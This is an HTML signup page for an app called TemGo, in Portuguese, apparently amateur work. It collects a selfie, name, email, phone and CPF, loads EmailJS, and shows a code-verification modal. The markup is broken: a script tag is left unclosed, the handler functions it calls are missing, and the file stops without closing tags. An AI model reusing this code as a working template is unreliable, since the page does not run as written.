<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TemGo - Cadastro Seguro</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
       (function(){
          emailjs.init("yTaC6x7E7XeVv4Am3"); // Sua Public Key real
       })();

    <style>
        :root { --yellow: #FFD700; --bg: #050505; --input: #121212; }
        body { margin: 0; padding: 20px; font-family: sans-serif; background: var(--bg); color: white; display: flex; flex-direction: column; align-items: center; }
        .container { width: 100%; max-width: 400px; padding-bottom: 40px; }
        header { text-align: center; margin-bottom: 20px; }
        .logo { color: var(--yellow); font-size: 35px; font-weight: bold; margin: 0; }
        
        /* Foto de Perfil */
        .profile-container { text-align: center; margin-bottom: 20px; }
        .profile-pic {
            width: 100px; height: 100px; background: var(--input); border: 2px solid var(--yellow);
            border-radius: 50%; margin: 0 auto 10px; position: relative;
            display: flex; align-items: center; justify-content: center; overflow: hidden;
        }
        .profile-pic img { width: 100%; height: 100%; object-fit: cover; display: none; }
        .profile-pic i { font-size: 30px; color: #333; }
        .profile-pic input { position: absolute; opacity: 0; width: 100%; height: 100%; cursor: pointer; }

        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; color: var(--yellow); font-size: 13px; font-weight: bold; }
        input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #222; background: var(--input); color: white; box-sizing: border-box; font-size: 16px; }

        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; justify-content: center; align-items: center; }
        .modal-content { background: #181818; width: 85%; padding: 25px; border-radius: 20px; border: 1px solid var(--yellow); text-align: center; }
        .btn-principal { width: 100%; padding: 18px; background: var(--yellow); color: black; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
    </style>
</head>
<body>

    <div class="container">
        <header>
            <div class="logo">TemGO</div>
            <p style="color: #888;">Complete seu cadastro</p>
        </header>

        <form onsubmit="mostrarConfirmacao(); return false;">
            <div class="profile-container">
                <div class="profile-pic">
                    <i class="fa-solid fa-camera" id="icon-cam"></i>
                    <img id="img-preview">
                    <input type="file" accept="image/*" capture="camera" required onchange="previewFoto(this)">
                </div>
                <label style="color: #555; font-size: 11px;">Toque para tirar foto</label>
            </div>

            <div class="form-group"><label>Nome</label><input type="text" id="nome" required></div>
            <div class="form-group"><label>E-mail</label><input type="email" id="email" required></div>
            <div class="form-group"><label>Celular</label><input type="tel" id="tel" placeholder="(00) 00000-0000" required></div>
            <div class="form-group"><label>CPF</label><input type="text" id="cpf" placeholder="000.000.000-00" required></div>

            <button type="submit" class="btn-principal">AVANÇAR</button>
        </form>
    </div>

    <div id="modal-codigo" class="modal">
        <div class="modal-content">
            <h2 style="color: var(--yellow);">Verificação</h2>
            <p style="font-size: 14px; color: #bbb;">Enviamos um código para o seu e-mail.</p>
            <input type="text" id="codigo-input" maxlength="4" style="width: 120px; text-align: center; font-size: 24px; margin: 20px 0; background: #000; border: 1px solid #333; color: #fff;">
            <button class="btn-principal" onclick="confirmarCadastro()">VALIDAR E ENTRAR</button>
        </div>
    </div>
